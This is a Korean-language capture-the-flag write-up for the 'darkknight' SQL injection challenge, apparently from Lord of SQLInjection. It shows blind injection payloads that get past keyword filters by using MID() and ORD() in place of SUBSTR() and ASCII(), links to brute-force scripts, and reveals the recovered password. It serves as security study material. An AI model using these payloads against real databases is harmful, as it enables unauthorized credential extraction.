## Q12. darkknight _ 
<img src="/photo/prob_12.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: ' / SUBSTR / ASCII / = <br> 문제 사항: admin의 패스워드를 찾아라.
### 해결책

```
주어진 쿼리 AND로 이어져 있음
=> 다 참이 되야함
but. 어려움
=> || 이용해 참이 되는 쿼리 먼저 만들어봄
```
```diff
# 현재 쿼리문: where id='guest' and pw='' and no=0||1
```
```
패스워드를 찾아야하므로 먼저 패스워드 길이를 찾아봄
=> length()함수 사용
=> 숫자 증가시키며 패스워드 길이 찾음
=> 반복되는 작업이므로 파이썬 코드를 이용함
=> 밑의 쿼리가 참이므로 패스워드 길이 = 8
```
```diff
# 현재 쿼리문: where id='guest' and pw='' and no=0||length(pw)<9
```
<참고> Python 코드 : [패스워드 길이 탐색](code/12_pwlength.py)
```
길이를 알아냈으므로 각자리의 문자 확인
=> SUBSTR()함수를 이용
but. SUBSTR()함수 사용X
=> 동일한 문자열 함수 MID() 사용
비교를 쉽게 하기 위해 ASCII()함수를 이용
but. ASCII()함수 사용X
=> ORD()함수 사용
```
```diff
# 현재 쿼리문: where id='guest' and pw='' and no=0||ord(mid(pw,1,1))<49
```
<참고> Python 코드 : [패스워드 문자 탐색](code/12_pw.py)
```
해결 쿼리문: where id='guest' and pw='0b70ea1f' and no=
```
### CERT <br> Python 코드 : [패스워드 길이 탐색](code/12_pwlength.py) / [패스워드 문자 탐색](code/12_pw.py)

### 느낀점
```diff
+ SQL 문자열 추출 함수를 추가로 배웠다.
+ MID(컬럼명 혹은 문자열, 시작위치, 골라낼 글자 수)

+ ASCII 코드로 반환하는 함수를 추가로 배웠다.
+ ORD(문자열)
```
